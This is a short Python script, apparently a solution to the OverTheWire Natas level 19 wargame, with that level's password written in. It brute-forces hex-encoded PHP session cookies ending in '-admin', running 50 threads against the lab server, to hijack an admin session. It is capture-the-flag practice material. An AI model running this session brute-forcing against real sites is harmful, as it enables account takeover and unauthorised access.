#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#


"""
Natas 19 Solution
"""

import logging
import sys

import requests
import concurrent.futures


logging.basicConfig(level=logging.INFO, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def str_to_hex(string):
    char_codes = [ord(c) for c in string]
    hex_codes = [hex(c) for c in char_codes]
    clean_hex_codes = [h.split("0x")[1] for h in hex_codes]
    return "".join(clean_hex_codes)


def get_page_text(session_num):
    logger.debug(session_num)
    encoded_session_num = str_to_hex("-".join([str(session_num), "admin"]))
    r = requests.get(
        "http://natas19.natas.labs.overthewire.org",
        auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"),
        cookies={"PHPSESSID": str(encoded_session_num)})
    if "You are an admin." in r.text:
        logger.info("Admin session: %d", session_num)
        print (r.text)


def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(get_page_text, range(640))


if __name__ == "__main__":
    main()
